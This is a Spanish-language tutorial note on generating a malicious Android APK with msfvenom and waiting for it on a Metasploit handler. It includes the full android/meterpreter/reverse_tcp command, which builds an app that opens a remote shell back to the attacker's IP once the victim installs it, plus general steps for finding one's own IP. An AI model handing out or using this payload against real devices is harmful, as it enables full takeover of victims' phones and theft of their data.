Dentro de esta sección vamos a aprender cómo crear nuestro *malware* usando **Msfvenom**, debido a que veremos pruebas revisando directorios y encontrando información multimedia e imagenes dentro del dispositivo. Para esto primeramente tendemos que tener ya instalada la aplicación maliciosa dentro de nuestro dispositivo o nuestro equipo.

Para ayudarnos a crear nuestra *Aplicación maliciosa* será ayudarnos de unos de los módulos que tiene **Metasploit** llamado **Msfvenom**.

Con **Msfvenom** vamos a crear nuestro *malware* y con **Metasploit** vamos a usar un *handler* para crear la conexión. Con el *handler* nos pondremos en modo escucha (*modo listening*) para esperar una conexión.

Cuando el equipo víctima instala la APK y la ejecuta, lo que va a ocurrir es que va a intentar realizar una conexión, y si nosotros nos encontramos en modo escucha, la conexión se establecerá correctamente. Y si se establece correctamente tendremos acceso completo al dispositivo.

Existen muchos tipos de *payloads* y en este caso vamos a usar uno que hace un **reverse tcp**. Este *payload* se caracteriza porque la víctima es la que se conecta a nosotros.

>El otro tipo de conexión que existe es la conexión **bind** que es cuando la victima está en modo escucha y nosotros nos tratamos de conectar a ella.

Pues vamos a empezar a crear nuestra aplicacion maliciosa podemos seguir los siguientes pasos:

Vamos a empezar ingresando a **Metasploit**:

```bash
msfconsole
```

````ad-note
title: Nota

Necesitamos la IP de nuestra máquina actula para usar el módulo con *Msfvenom*:

```ad-info
title: Linux (Debian/Ubuntu y Red Hat/CentOS):
collapse: true

1. **Comando `ifconfig` (en desuso en algunas distribuciones):**

	- Abre una terminal.
	- Escribe `ifconfig` y busca la sección correspondiente a la interfaz de red para encontrar tu dirección IP.

2. **Comando `ip` (recomendado):**

	- Abre una terminal.
	- Escribe `ip a` y busca la sección correspondiente a la interfaz de red para encontrar tu dirección IP.

3. **Comando `hostname -I`:**

	- Abre una terminal.
	- Escribe `hostname -I` y encuentra tu dirección IP actual.

4. **Comando `ss` (Socket Statistics):**
    
    - Abre una terminal.
    - Escribe `ss -tuln` para ver las conexiones de red y las direcciones IP locales.

5. **Comando `nmcli` (NetworkManager Command-Line Interface, en sistemas con NetworkManager):**
    
    - Abre una terminal.
    - Escribe `nmcli device show` para obtener información detallada de las interfaces de red, incluyendo la dirección IP si está configurada mediante NetworkManager.
```

```ad-info
title: Windows
collapse: true

1. **Utilizando el símbolo del sistema (CMD):**
    
    - Abre el símbolo del sistema.
    - Escribe `ipconfig` y busca la sección correspondiente a la interfaz de red para encontrar tu dirección IP.

2. **Utilizando PowerShell:**
    
    - Abre PowerShell.
    - Escribe `Get-NetIPAddress` para obtener información de la dirección IP.

3. **Configuración de red en la interfaz gráfica:**
    
    - Ve a "Configuración" (Windows + I).
    - Haz clic en "Red e Internet".
    - Selecciona tu conexión de red activa y encuentra la dirección IPv4 bajo "Configuración de IPv4".
```

```ad-info
title: MacOS
collapse: true

1. **Utilizando la Terminal:**
    
    - Abre la Terminal.
    - Escribe `ifconfig` y busca la sección correspondiente a la interfaz de red para encontrar tu dirección IP.

2. **Utilizando el menú de red (método gráfico):**
    
    - Haz clic en el ícono de Apple en la esquina superior izquierda.
    - Ve a "Preferencias del Sistema" > "Red".
    - Selecciona la conexión de red activa y encuentra tu dirección IP en la parte derecha de la ventana.

3. **Utilizando el comando `networksetup` (para obtener información de la interfaz específica):**
    
    - Abre una terminal.
    - Escribe `networksetup -getinfo Wi-Fi` para la interfaz Wi-Fi, o `networksetup -getinfo Ethernet` para la interfaz Ethernet. La dirección IP se mostrará en la salida.

4. **Utilizando el comando `netstat` (para ver la dirección IP predeterminada):**
    
    - Abre una terminal.
    - Escribe `netstat -nr | grep default` para ver la dirección IP predeterminada.

5. **Utilizando el comando `arp` (para encontrar la dirección IP de dispositivos en la red local):**
    
    - Abre una terminal.
    - Escribe `arp -a` para ver una lista de dispositivos en la red local junto con sus direcciones IP.
```

````

Entonces dentro de la consola de **Metasploit** vamos a empezar a usar los *payloads* para generar nuestra aplicación maliciosa:

```shell
msf6 > msfvenom -p android/meterpreter/reverse_tcp LHOST=<DIRECCON_IP> LPORT=<PUERTO> -o <APK_MALICIOSA>.apk
```

Donde:
- `LHOST`: será la IP de nuestra máquina atacante.
- `LPORT`: será el puerto que vamos a usar para establecer la conexión.
- `APK_MALICIOSA`: será el nombre que le daremos a nuestra aplicación maliciosa.

Y ahora tendremos generada nuestra *aplicación maliciosa* con el nombre que la hayamos dado.

Ahora deberemos de transferirla e instalarla dentro de nuestro dispositivo móvil, para eso podemos ayudarnos creando un servidor web para transferir archivos[^1].










[^1]: Traspasar ficheros por red:
	- [[Servidor Apache]]
	- [[Servidor Python]]


